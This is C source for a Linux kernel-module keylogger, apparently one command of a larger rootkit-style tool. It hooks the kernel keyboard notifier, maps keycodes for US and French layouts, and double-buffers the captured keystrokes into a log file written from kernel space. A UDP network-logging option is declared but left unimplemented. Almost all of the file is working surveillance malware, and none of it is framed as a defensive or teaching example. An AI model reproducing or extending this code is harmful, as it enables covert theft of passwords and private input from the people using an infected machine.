#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <net/sock.h>

#include "headers/keylogger.h"


void flush_buffer(struct keyboard_logger *klogger)
{
    // Swap the buffer
    char *tmp = klogger->keyboard_buffer;
    klogger->keyboard_buffer = klogger->write_buffer;
    klogger->write_buffer = tmp;
    klogger->buffer_len = klogger->buffer_offset;

    // Start to write the buffer to the log file
    schedule_work(&klogger->writer_task);

    // Reset the keyboard buffer
    memset(klogger->keyboard_buffer, 0x0, MAX_BUFFER_SIZE);
    klogger->buffer_offset = 0;
}

size_t keycode_to_string(int keycode, int shift, char *buffer, size_t buff_size, const char *layout) {
    memset(buffer, 0x0, buff_size);

    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
        const char *key;
        if (strcmp(layout, "us") == 0) {
            key = (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
        } else if (strcmp(layout, "fr") == 0) {
            key = (shift == 1) ? fr_keymap[keycode][1] : fr_keymap[keycode][0];
        } else {
            return 0; // Invalid layout
        }
        snprintf(buffer, buff_size, "%s", key);
        return strlen(buffer);
    }

    return 0; // Return 0 if keycode is invalid
}

int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data) 
{
    struct keyboard_notifier_param *key_param;
    size_t keystr_len = 0;
    char tmp_buff[TMP_BUFF_SIZE];

    key_param = (struct keyboard_notifier_param *)data;

    // Log only when a key is pressed down
    if (!(key_param->down) || (keystr_len = keycode_to_string(key_param->value, key_param->shift, tmp_buff, TMP_BUFF_SIZE, klogger->layout)) < 1)
        return NOTIFY_OK;

    // With the endline, we will swap the buffer and write it on the log file
    if (tmp_buff[0] == '\n') {
        klogger->keyboard_buffer[klogger->buffer_offset++] = '\n';
        flush_buffer(klogger);
        return NOTIFY_OK;
    }

    // Check if buffer needs flushing
    if ((klogger->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1)
        flush_buffer(klogger);

    strncpy(klogger->keyboard_buffer + klogger->buffer_offset, tmp_buff, keystr_len);
    klogger->buffer_offset += keystr_len;

    return NOTIFY_OK;
}

void write_log_task(struct work_struct *work)
{
    struct keyboard_logger *klogger;

    klogger = container_of(work, struct keyboard_logger, writer_task);

    // Write the file
    kernel_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
}

void execute_keylogger_command(const char **args, int arg_count)
{
    printk(KERN_INFO "[+] Keylogger command is being executed\n");

    // Validate the number of arguments
    if (arg_count < 3) {
        pr_err("Insufficient arguments provided. Expected at least 3.\n");
        return;
    }

    // Initialize keyboard logger structure
    klogger = kzalloc(sizeof(struct keyboard_logger), GFP_KERNEL);
    if (!klogger) {
        pr_err("Unable to allocate memory for keyboard_logger\n");
        return;
    }

    // Check keyboard layout
    if (strcmp(args[0], "fr") == 0) {
        klogger->layout = "fr";  // Set to French layout
        printk(KERN_INFO "[+] Keyboard layout set to: FR\n");
    } else if (strcmp(args[0], "us") == 0) {
        klogger->layout = "us";  // Set to US layout
        printk(KERN_INFO "[+] Keyboard layout set to: US\n");
    } else {
        pr_err("Invalid keyboard layout specified: %s\n", args[0]);
        kfree(klogger);
        return;
    }

    // Handle logging method
    if (strcmp(args[1], "file") == 0) {
        printk(KERN_INFO "[+] File logging initiated with file: %s\n", args[2]);
        klogger->log_file = filp_open(args[2], O_CREAT | O_RDWR | O_APPEND, 0644);
        if (IS_ERR(klogger->log_file)) {
            pr_err("Unable to open log file: %ld\n", PTR_ERR(klogger->log_file));
            kfree(klogger);
            return;
        }
    } else if (strcmp(args[1], "udp") == 0) {
        printk(KERN_INFO "[+] UDP logging initiated to IP: %s and port: %s\n", args[2], args[3]);
        
        // Here, you would implement the UDP socket creation and connection logic.
        // Since this part is not implemented yet, we'll just print a message.
        pr_info("UDP logging not implemented yet.\n");
        kfree(klogger);
        return;
    } else {
        pr_err("Invalid logging method specified: %s\n", args[1]);
        kfree(klogger);
        return;
    }

    // Setup the double buffer for logging
    klogger->keyboard_buffer = klogger->side_buffer;
    klogger->write_buffer = klogger->back_buffer;

    // Initialize the notifier and work structure
    klogger->keyboard_notifier.notifier_call = keyboard_callback;
    INIT_WORK(&klogger->writer_task, write_log_task);

    // Register the keyboard notifier
    register_keyboard_notifier(&klogger->keyboard_notifier);
    pr_info("Keylogger initialized successfully.\n");
}
